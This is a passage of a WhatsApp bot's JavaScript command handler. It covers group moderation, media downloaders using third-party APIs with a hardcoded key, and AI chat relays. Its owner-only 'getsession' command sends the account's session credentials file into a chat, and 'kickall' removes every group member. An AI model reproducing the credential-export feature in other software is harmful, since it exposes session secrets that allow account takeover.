                }
                case 'antilink': {
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin) // Check if the user is a group admin or owner
                    await loading()
                    if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1') {
                        if (isAntiLink) return setReply('THE FEATURE IS ALREADY ACTIVE.');
                        db.data.chats[from].antilink = true;
                        let ih = `THE ANTILINK FEATURE HAS BEEN ACTIVATED.`;
                        setReply(ih);
                    } else if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                        if (!isAntiLink) return setReply('THE ANTILINK FEATURE IS ALREADY OFF.');
                        db.data.chats[from].antilink = false;
                        let ih = `THE ANTILINK FEATURE HAS BEEN DEACTIVATED.`;
                        setReply(ih);
                    } else if (!q) {
                        reply(`*ANTI LINK MODE*\n ${prefix + command} on/off`);
                    }
                }
                break;
                case 'getsession': {
                    // Check if the sender is the owner
                    // Replace with your WhatsApp owner number
                    if (!isOwner) return reply(mess.only.owner);
                    await loading()
                    const credsPath = './session/creds.json';
                    const fs = require('fs');

                    try {
                        // Check if the file exists
                        if (!fs.existsSync(credsPath)) {
                            return reply('Sorry, the session file does not exist.');
                        }

                        // Send the session file as a document
                        await conn.sendMessage(m.chat, {
                            document: fs.readFileSync(credsPath), // Read the file
                            mimetype: 'application/json',
                            fileName: 'ᴄʀᴇᴅꜱ.ᴊꜱᴏɴ ʙy ʙʟᴜᴇxᴅᴇᴍᴏɴ' // Name of the file to send
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error(error);
                        reply(`An error occurred: ${error.message}`);
                    }
                    break;
                }
                case 'mute': {
                    // Check if the command is being used in a group
                    if (!m.isGroup) return setReply(mess.only.group);
                    // Check if the user is an admin or the owner of the bot
                    if (!isOwner && !isAdmins) return setReply(mess.only.admin);

                    // Check if the bot has admin rights
                    if (!isBotAdmins) return setReply(mess.only.Badmin);

                    try {
                        await loading()
                        // Mute the group (only admins can send messages)
                        await conn.groupSettingUpdate(m.chat, 'announcement');
                        reply(mess.success);
                    } catch (err) {
                        console.error(err);
                        reply('Failed to mute the group. Please try again.');
                    }
                    break;
                }
                case 'unmute': {
                    // Check if the command is being used in a group
                    if (!m.isGroup) return setReply(mess.only.group);

                    // Check if the user is an admin or the owner of the bot
                    if (!isOwner && !isAdmins) return setReply(mess.only.admin);

                    // Check if the bot has admin rights
                    if (!isBotAdmins) return setReply(mess.only.Badmin);

                    try {
                        await loading()
                        // Unmute the group (everyone can send messages)
                        await conn.groupSettingUpdate(m.chat, 'not_announcement');
                        reply(mess.success);
                    } catch (err) {
                        console.error(err);
                        reply('Failed to unmute the group. Please try again.');
                    }
                    break;
                }
                case 'welcome': {
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isAdmins && !isOwner) return setReply(mess.only.admin)
                    if (!q) return setReply("Enter the query 'on' or 'off'");
                    await loading()
                    if (q == 'on') {
                        if (chat.welcome == true) return setReply('Welcome is already active');
                        db.data.chats[from].welcome = true;
                        setReply('SUCCESSFULLY ACTIVATED WELCOME IN THIS GROUP');
                    } else if (q == 'off') {
                        if (chat.welcome == false) return setReply('WELCOME IS ALREADY INACTIVE');
                        db.data.chats[from].welcome = false;
                        setReply('SUCCESSFULLY DEACTIVATED WELCOME IN THIS GROUP');
                    } else setReply('Choose "on" or "off"');
                }
                break;
                case 'promote':
                    if (!isGroup && !isGroupAdmins) return setReply(mess.only.group)
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
                    await loading()
                    let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await conn.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                    reply(mess.success)
                    break
                case 'demote':
                    if (!isGroup && !isGroupAdmins) return setReply(mess.only.group)
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
                    await loading()
                    let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await conn.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                    setReply(mess.success)
                    break
                case 'tagadmin':
                case 'listadmin': {
                    if (!m.isGroup) return setReply(mess.only.group)
                    const groupAdmins = participants.filter(p => p.admin)
                    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
                    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-` [0] + '@s.whatsapp.net'
                    let text = Ehztext(`   
*Group Admins:*
${listAdmin}
`.trim())
                    conn.sendMessage(m.chat, {
                        text: text,
                        mentions: [...groupAdmins.map(v => v.id), owner]
                    }, {
                        quoted: m
                    })
                }
                break
                case 'tagme': {
                    let menst = [sender]
                    conn.sendMessage(from, {
                        text: `@${senderNumber}`,
                        mentions: menst
                    })
                }
                break
                case 'kickall': {
                    if (!isGroup && !isGroupAdmins) return setReply(mess.only.group)
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
                    const xeonkickall = (args[0] === 'numBut') ?
                        q.replace(`${args[0]} `, '').split('|') :
                        (Number(args[0])) ?
                        groupMetadata.participants
                        .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${botNumber}@s.whatsapp.net`)
                        .map(item => item.id) :
                        groupMetadata.participants
                        .filter(item => item.id !== botNumber && item.id !== `${botNumber}@s.whatsapp.net`)
                        .map(item => item.id);
                    if (chat.welcome == false)
                        db.data.chats[from].welcome = false
                    for (let remove of xeonkickall) {
                        await conn.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
                        await sleep(100);
                    }
                    reply(mess.success);
                }
                break
                case 'infogc':
                case 'gcinfo': {
                    if (!isGroup) return setReply(mess.only.group)
                    await loading()
                    let _meta = await conn.groupMetadata(from)
                    console.log(_meta)
                    let _img = await conn.profilePictureUrl(_meta.id, 'image')

                    let caption = `*G R O U P I N F O*


Anti Link : *${isAntiLink ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti Virtex : *${isAntiVirtex ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti Delete : *${isAntidelete ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti ViewOnce : *${isAntiViewOnce ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti Toxic : *${isAntiToxic ? 'ACTIVE✅' : 'UNACTIVE❌'}*


⭓ *Name :* ${_meta.subject}
⭓ *Group ID :* ${_meta.id}
⭓ *Created on :* ${moment(_meta.creation * 1000).format('ll')}
⭓ *GC owner:* ${_meta.subjectOwner}
⭓ *Admins length:* ${_meta.participants.filter(x => x.admin === 'admin').length}
⭓ *participants length:* ${_meta.participants.filter(x => x.admin === null).length}
⭓ *Desc :* 
${_meta.desc}`

                    await conn.sendMessage(from, {
                        caption,
                        image: await getBuffer(_img)
                    }, {
                        quoted: fcall
                    })
                }
                break
                case 'setppgc': {
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isGroupAdmins) return setReply(mess.only.admin)
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
                    await loading()
                    if (isImage || isQuotedImage) {
                        let media = await conn.downloadAndSaveMediaMessage(quoted, makeid(5))
                        await conn.updateProfilePicture(from, {
                                url: media
                            })
                            .then(res => {
                                reply(mess.success)
                                fs.unlinkSync(media)
                            }).catch(() => reply(mess.error.api))
                    } else {
                        setReply(`Send/reply images with captions ${command}`)
                    }
                }
                break
                case 'getppgc':
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isGroupAdmins) return setReply(mess.only.admin)
                    await loading()
                    try {
                        var ppimg = await conn.profilePictureUrl(from, 'image')
                    } catch (err) {
                        console.log(err)
                        var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    await conn.sendMessage(from, {
                        image: {
                            url: ppimg
                        }
                    }, {
                        quoted: m
                    })
                    break
                case 'delppgc': {
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isGroupAdmins) return setReply(mess.only.admin)
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
                    await loading()
                    await conn.removeProfilePicture(from)
                }
                break
                case 'setnamegc':
                case 'setgcname': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
                    if (!q || q.trim().length === 0) return setReply(`Usage: ${command} <new group name>`);

                    await conn.groupUpdateSubject(from, q)
                        .then(() => {
                            reply(mess.success);
                        })
                        .catch(() => {
                            setReply(mess.error.api);
                        });
                    break;
                }

                case 'setdesc': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
                    if (!q || q.trim().length === 0) return setReply(`Usage: ${command} <new group description>`);

                    await conn.groupUpdateDescription(from, q)
                        .then(() => {
                            reply(mess.success);
                        })
                        .catch(() => {
                            setReply(mess.error.api);
                        });
                    break;
                }
               case 'inspect': {
                    const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
                    let code = q.match(rex1);
                    if (code === null) return reply("No invite url detected.");
                    code = code[0].replace("chat.whatsapp.com/", "");
                    let nana = await conn.groupGetInviteInfo(code)
                    //console.log(nana)
                    let {
                        id,
                        subject,
                        creator,
                        creation,
                        desc,
                        descId
                    } = await conn.groupGetInviteInfo(code).catch(async () => {
                        return reply("Invalid invite url.");
                    });
                    let text = Ehztext(
                        `Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` + `${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`)
                    setReply(text)

                }
                break
                case 'revoke':
                case 'resetgclink': {
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isOwner && !isGroupAdmins) return setReply(mess.only.admin)
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
                    conn.groupRevokeInvite(from)
                }
                break

                case 'opentime': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);

                    if (args[1] == "seconds") {
                        var timer = args[0] * `1000`;
                    } else if (args[1] == "minutes") {
                        var timer = args[0] * `60000`;
                    } else if (args[1] == "hours") {
                        var timer = args[0] * `3600000`;
                    } else if (args[1] == "days") {
                        var timer = args[0] * `86400000`;
                    } else {
                        return setReply("*Choose:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
                    }

                    reply(`Open time ${q} starts now`);
                    setTimeout(() => {
                        const open = Ehztext(`*On time*: The group is now opened by an admin\nMembers can now send messages`);
                        conn.groupSettingUpdate(from, 'not_announcement');
                        reply(open);
                    }, timer);
                    break;
                }

                case 'closetime': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);

                    if (args[1] == "seconds") {
                        var timer = args[0] * `1000`;
                    } else if (args[1] == "minutes") {
                        var timer = args[0] * `60000`;
                    } else if (args[1] == "hours") {
                        var timer = args[0] * `3600000`;
                    } else if (args[1] == "days") {
                        var timer = args[0] * `86400000`;
                    } else {
                        return setReply(`Example: ${prefix}closetime 5 seconds`);
                    }

                    let ko = await conn.sendMessage(from, {
                        text: `Close time ${q} starts now`
                    }, {
                        quoted: m
                    });
                    setTimeout(() => deleteMessage(ko), 5000);

                    setTimeout(() => {
                        const close = Ehztext(`*On time*: The group is now closed by an admin\nOnly admins can send messages`);
                        conn.groupSettingUpdate(from, 'announcement');
                        reply(close);
                    }, timer);
                }
                break;
                case 'linkgroup':
                case 'gclink': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
                    let response = await conn.groupInviteCode(from)
                    conn.sendText(from, `https://chat.whatsapp.com/${response}\n\n${themeemoji} *Group link: ${groupMetadata.subject}*`, m, {
                        detectLink: true
                    })
                }
                break
                case 'antivirtex': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
                    await loading()
                    const mode = args[0]?.toLowerCase(); // Normalize input for case-insensitivity

                    if (["on", "enable", "1"].includes(mode)) {
                        if (isAntiVirtex) return setReply("ANTIVIRTEX IS ALREADY ENABLED!");
                        db.data.chats[from].antivirtex = true;
                        setReply("SUCCESSFULLY ENABLED ANTIVIRTEX!");
                    } else if (["off", "disable", "0"].includes(mode)) {
                        if (!isAntiVirtex) return setReply("Antivirtex Is Already Disabled!");
                        db.data.chats[from].antivirtex = false;
                        setReply("SUCCESSFULLY DISABLED ANTIVIRTEX!");
                    } else {
                        setReply(`*ANTI VIRTEX MODE*\nUsage: ${prefix + command} on/off`);
                    }
                    break;
                }
                case 'antibot': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
                    await loading()
                    const mode = args[0]?.toLowerCase(); // Normalize input for case-insensitivity
                    if (!mode || !["on", "off"].includes(mode)) {
                        return setReply(`*ANTI-BOT MODE*\nUsage: ${prefix + command} on/off`);
                    }

                    if (mode === "on") {
                        if (db.data.chats[from]?.antibot === true) return setReply("ANTIBOT IS ALREADY ENABLED!");
                        db.data.chats[from].antibot = true;
                        setReply("SUCCESSFULLY ENABLED ANTIBOT!");
                    } else if (mode === "off") {
                        if (db.data.chats[from]?.antibot === false) return setReply("ANTIBOT IS ALREADY DISABLED!");
                        db.data.chats[from].antibot = false;
                        setReply("SUCCESSFULLY DISABLED ANTIBOT!");
                    }
                    break;
                }
                case 'antiviewonce': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins) return setReply(mess.only.admin);
                    await loading()
                    const mode = args[0]?.toLowerCase(); // Normalize input for case-insensitivity
                    if (!mode || !["on", "off", "enable", "disable", "1", "0"].includes(mode)) {
                        return setReply(`*VIEW ONCE MODE*\n• ${prefix + command} on\n• ${prefix + command} off`);
                    }

                    if (["on", "enable", "1"].includes(mode)) {
                        if (isAntiViewOnce) return setReply("The View Once feature is already enabled!");
                        db.data.chats[from].viewonce = true;
                        setReply(`The ${command} feature has been successfully enabled.`);
                    } else if (["off", "disable", "0"].includes(mode)) {
                        if (!isAntiViewOnce) return setReply(`The ${command} feature is already disabled!`);
                        db.data.chats[from].viewonce = false;
                        setReply(`The ${command} feature has been successfully disabled.`);
                    }
                    break;
                }
                case 'yts': {
                    if (!q) return reply("Please provide a search query.");
                    await loading()

                    try {
                        const searchResults = await yts(q);
                        const videoResults = searchResults.all.filter((v) => v.type === 'video');
                        if (!videoResults || videoResults.length === 0) return setReply("No videos found.");

                        const videoID = videoResults[0].videoId;
                        const thumbnail = `https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`;

                        let responseMessage = `🔎 *YouTube Search Results:*\n`;
                        for (let video of videoResults) {
                            responseMessage += `
📜 *Title:* ${video.title}
📈 *Views:* ${video.views}
📅 *Uploaded:* ${video.ago}
⏱️ *Duration:* ${video.timestamp}
🎥 *Channel:* ${video.author.name}
🔗 *Link:* ${video.url}\n\n`;
                        }

                        // Send search results with the first video thumbnail
                        await conn.sendMessage(
                            from, {
                                caption: responseMessage.trim(),
                                image: {
                                    url: thumbnail
                                },
                            }, {
                                quoted: dev
                            }
                        );
                    } catch (error) {
                        console.error(error);
                        setReply("An error occurred while fetching the YouTube search results.");
                    }
                    break;
                }
                case 'tiktok':
case 'tt': {
    if (!q) return reply(`\`No Tiktok link detected\`\n*Example:  ${prefix + command} link*`);
    await loading();

    try {
        // Fetching data from the new API
        const response = await fetchJson(`https://api-lenwy.vercel.app/tiktok?url=${encodeURIComponent(q)}`);
        const data = response.data;

        // Constructing the caption with the relevant information
        const caption = `*[ TIKTOK DOWNLOADER ]*

*Title*: _${data.title}_
*By*: _${data.creator}_

> 𝙿𝚘𝚠𝚎𝚛𝚎𝚍 𝚋𝚢 𝙱𝙻𝚄𝙴𝙳𝙴𝙼𝙾𝙽🐦‍🔥
`;

        // Sending the video with no watermark and the constructed caption
        conn.sendMessage(m.chat, {
            caption: caption,
            video: {
                url: data.no_watermark
            }
        }, { quoted: m });
    } catch (err) {
        console.error("Error fetching TikTok data:", err);
        reply("Error fetching the video. Please try again.");
    }

    break;
}
        case 'ytmp4': {
    if (!q) {
        return reply(`*Please provide a YouTube URL.*\n\n*Example:* ${prefix + command} https://youtu.be/UDSYAD1sQuE`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/youtube2?url=${encodeURIComponent(q)}`;

        // Fetch video details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9 || !res.BK9.BK9) {
            return reply("Failed to fetch the YouTube video. Please try again later.");
        }

        // Extract the download URL
        const downloadUrl = res.BK9.BK9;

        // Send the video file
        await conn.sendMessage(m.chat, {
            video: { url: downloadUrl }, // Send the video from the provided URL
            caption: `🎥 *YouTube Video*\n\n✅ *Downloaded Successfully*\n\n> ${caption}`,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in ytmp4 case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}        
                case 'fb':
                case 'facebook':
                case 'facebookvid': {
                    if (!q) {
                        return reply(`\`No Facebook link detected\`\n*Example:  ${prefix + command} link*`);
                    }
                    // Send a waiting message
                    await loading()
                    try {
                        // Fetch video data from the new API
                        const response = await fetchJson(`https://api.giftedtech.my.id/api/download/facebook?apikey=gifted&url=${encodeURIComponent(q)}`);

                        // Validate API response
                        if (!response || !response.success || !response.result) {
                            return reply("Failed to fetch the video. Ensure the link is valid and try again.");
                        }

                        const {
                            hd_video,
                            sd_video,
                            title
                        } = response.result;
                        const videoUrl = hd_video || sd_video; // Prefer HD video if available
                        const videoQuality = hd_video ? "HD" : "SD";

                        // Prepare the caption
                        const captionText = `*[ DOWNLOAD COMPLETED BY ${botName} ]*\n\n❖ Title: ${title}\n❖ Quality: ${videoQuality}`;

                        // Send the video
                        await conn.sendMessage(
                            from, {
                                video: {
                                    url: videoUrl
                                },
                                caption: captionText,
                            }, {
                                quoted: m
                            }
                        );

                    } catch (error) {
                        console.error(error); // Log the error for debugging
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'ytmp3': {
                    if (!q) {
                        return reply(`\`No YouTube link detected\`\n*Example:  ${prefix + command} link*`);
                    }
                    await loading()
                    try {
                        // Fetch audio data from the API
                        const response = await fetchJson(`https://api.giftedtech.my.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(q)}`);

                        // Validate API response
                        if (!response || !response.success || !response.result) {
                            return reply("Failed to fetch the audio. Ensure the link is valid and try again.");
                        }

                        const {
                            quality,
                            title,
                            thumbnail,
                            download_url
                        } = response.result;

                        // Prepare the caption
                        const captionText = `*[ DOWNLOAD COMPLETED BY ${botName} ]*\n\n❖ Title: ${title}\n❖ Quality: ${quality}`;

                        // Send the thumbnail with details
                        await conn.sendMessage(
                            from, {
                                image: {
                                    url: thumbnail
                                },
                                caption: captionText,
                            }, {
                                quoted: m
                            }
                        );

                        // Send the MP3 file
                        await conn.sendMessage(
                            from, {
                                audio: {
                                    url: download_url
                                },
                                mimetype: 'audio/mpeg',
                                fileName: `${title}.mp3`,
                            }, {
                                quoted: m
                            }
                        );

                    } catch (error) {
                        console.error(error); // Log the error for debugging
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'mediafire':
case 'mfdl': {
    if (args.length < 1) {
        return reply(`\`No Mediafire link detected\`\n*Example: ${prefix + command} https://www.mediafire.com/file/example/file.rar/file*`);
    }

    try {
        await loading();

        // Fetch the Mediafire file details using the API
        const apiUrl = `https://bk9.fun/download/mediafire?url=${encodeURIComponent(args.join(' '))}`;
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch the Mediafire data. Please check the URL or try again later.");
        }

        const { link, name, filetype, size } = res.BK9;

        // Send the file details
        const captionx = `\`FILE DOWNLOADED SUCCESSFULLY\`

📄 *File Name:* ${name}  
📦 *File Type:* ${filetype}  
📏 *Size:* ${size}  

> ${caption}`;
        await conn.sendMessage(from, {
            document: { url: link }, // Download and send the file
            mimetype: "application/octet-stream", // Default mimetype for files
            fileName: name, // File name
            caption: captionx, // Caption with file details
        }, { quoted: m });

    } catch (error) {
        console.error("Error in mediafire case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
                case 'githubdl':
                case 'gitclone': {
                    try {
                        if (!q) return reply(`\`No GitHub link detected\`\n*Example:  ${prefix + command} link without .git*`);

                        await loading();

                        // Make API request using the provided GitHub URL
                        let res = await fetchJson(`https://api.giftedtech.my.id/api/download/gitclone?apikey=gifted&url=${q}`);

                        if (res.status !== 200 || !res.success) {
                            return setReply("Failed to fetch GitHub repository.");
                        }

                        const {
                            name,
                            download_url
                        } = res.result;

                        // Download the ZIP file using the download URL
                        const zipFile = await fetch(download_url);
                        const zipBuffer = await zipFile.buffer();

                        // Send the ZIP file to the user
                        await conn.sendMessage(from, {
                            document: zipBuffer,
                            mimetype: "application/zip",
                            fileName: `${name}.zip`
                        }, {
                            quoted: m
                        });

                    } catch (e) {
                        console.error(e);
                        setReply("An error occurred while processing your request.");
                    }
                    break;
                }
                case 'block': {
                    if (!isOwner) return reply(mess.only.owner);
                    await loading()
                    let users;

                    if (isGroup) {
                        // In a group, block the sender of the quoted message or the number from the input text
                        if (m.quoted && m.quoted.sender) {
                            users = m.quoted.sender;
                        } else if (text) {
                            users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                        }
                    } else {
                        // In a private chat, block the other person's number
                        users = m.chat;
                    }

                    if (users) {
                        // Ensure the number is not an empty string and contains valid characters
                        if (users.replace(/[^0-9]/g, '').length < 7) {
                            return reply('Invalid number. Please provide a valid number.');
                        }

                        // Block the user
                        await conn.updateBlockStatus(users, "block");
                        reply(mess.success);
                    } else {
                        reply("Please reply to the message or input the number you want to block.");
                    }
                    break;
                }
                case 'unblock': {
                    if (!isOwner) return setReply(mess.only.group);

                    let users;

                    if (isGroup) {
                        // In a group, unblock the sender of the quoted message or the number from the input text
                        users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    } else {
                        // In a private chat, unblock the other person's number
                        users = m.chat;
                    }

                    if (users) {
                        // Ensure the number is not an empty string and contains valid characters
                        if (users.replace(/[^0-9]/g, '').length < 7) {
                            return reply('Invalid number. Please provide a valid number.');
                        }

                        // Unblock the user
                        await conn.updateBlockStatus(users, "unblock");
                        reply(mess.success);
                    } else {
                        reply("Please reply to the message or input the number you want to unblock.");
                    }
                    break;
                }
                case 'clearchat':
                case 'clear': {
                    if (!isOwner) return setReply(mess.only.owner);

                    conn.chatModify({
                            delete: true,
                            lastMessages: [{
                                key: m.key,
                                messageTimestamp: m.messageTimestamp
                            }]
                        },
                        m.chat
                    );

                    reply(mess.success);
                }
                break;
                case 'join': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner
                    if (!text) return reply(`\`No Group link detected\`\n*Example:  ${prefix + command} link*`);
                    if (!isUrl(text) || !text.includes('chat.whatsapp.com')) return reply('`Invalid Link!`');

                    const result = text.split('https://chat.whatsapp.com/')[1];
                    await loading()
                    try {
                        await conn.groupAcceptInvite(result);
                    } catch (error) {
                        // Handle different error responses
                        if (error.response) {
                            switch (error.response.status) {
                                case 400:
                                    return reply('Group Not Found❗');
                                case 401:
                                    return reply('Bot Kicked From The Group❗');
                                case 409:
                                    return reply('Bot Has Already Joined the Group❗');
                                case 410:
                                    return reply('Group URL Has Been Reset❗');
                                case 500:
                                    return reply('Group Is Full❗');
                                default:
                                    return reply('An unknown error occurred.');
                            }
                        }
                        reply('An unexpected error occurred.');
                    }
                    break;
                }
                case 'leavegc':
                    if (!isGroup) return setReply(mess.only.group)
                    if (!isOwner) return setReply(mess.only.owner)
                    await loading()
                    await conn.groupLeave(from)
                    break
                case 'setname':
                case 'setbotname': {
                    if (!isOwner) return setReply(mess.only.owner); // Restrict access to owners only
                    if (!text) return reply(`*Example: ${prefix + command} BLUE DEMON*`); // Ensure text is provided

                    try {
                        await conn.updateProfileName(text); // Update the bot's profile name
                        reply(`*SUCCESSFULLY CHANGED NAME TO \`${text}\`*`);
                    } catch (error) {
                        console.error(error);
                        reply("An error occurred while updating the name. Please try again.");
                    }
                    break;
                }

                case 'setbio':
                case 'setbotbio': {
                    if (!isOwner) return setReply(mess.only.owner); // Restrict access to owners only
                    if (!q) return reply(`*Example: ${prefix + command} Text*`); // Ensure a bio text is provided

                    try {
                        await conn.updateProfileStatus(q); // Update the bot's profile bio/status
                        reply(`*BIO HAS BEEN CHANGED TO \`${q}\`*`);
                    } catch (error) {
                        console.error(error);
                        reply("An error occurred while updating the bio. Please try again.");
                    }
                    break;
                }
                case 's':
                case 'sticker':
                case 'take': {
                    if (!m.quoted) {
                        return setReply(`*Reply to an image or video with the caption ${prefix + command}*\n> Video Duration: 1-9 Seconds`);
                    }

                    let mime = (m.quoted.msg || m.quoted).mimetype || '';

                    try {
                        if (/image/.test(mime)) {
                            // Handle image sticker creation
                            let media = await m.quoted.download();
                            await conn.sendImageAsSticker(m.chat, media, m, {
                                packname: packName || 'Sticker Pack',
                                author: authorName || 'Bot'
                            });
                        } else if (/video/.test(mime)) {
                            // Check video duration
                            if ((m.quoted.msg || m.quoted).seconds > 9) {
                                return setReply(`*Video duration must be 1-9 seconds!*\nReply to a shorter video with ${prefix + command}`);
                            }

                            // Handle video sticker creation
                            let media = await m.quoted.download();
                            await conn.sendVideoAsSticker(m.chat, media, m, {
                                packname: packName || 'Sticker Pack',
                                author: authorName || 'Bot'
                            });
                        } else {
                            // Unsupported media type
                            setReply(`*Unsupported media type!*\nReply to an image or video with the caption ${prefix + command}\n> Video Duration: 1-9 Seconds`);
                        }
                    } catch (err) {
                        console.error('Error creating sticker:', err);
                        setReply(`Failed to create sticker. Please try again.`);
                    }
                }
                break;
                case 'gemini': {
    if (!q) return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://api-lenwy.vercel.app/ai4chat?text=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (res.status !== 200 || !res.data) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Send AI response with the image
        const aiResponse = res.data; // Extract response text
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/gemini.jpg' // Local image path
            },
            caption: `*Gemini AI Response:*\n\n\`\`\`${aiResponse}\`\`\`\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Gemini case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'gemini2': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/gemini?q=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.BK9;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/gemini2.jpg' // Local image path
            },
            caption: `*Gemini AI V2 Response:*\n\n\`\`\`${aiResponse}\`\`\`\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Gemini case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'gemini-pro': case 'ai': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/acloudai?q=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.BK9;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/geminipro.jpg' // Local image path
            },
            caption: `*Gemini pro Response:*\n\n\`\`\`${aiResponse}\`\`\`\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Gemini-pro case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'blackbox': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
    const prompt = "your name now is BLACKBOX AI, Question= "
        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/acloudai?q=${encodeURIComponent(prompt)}${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.BK9;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/blackbox.jpg' // Local image path
            },
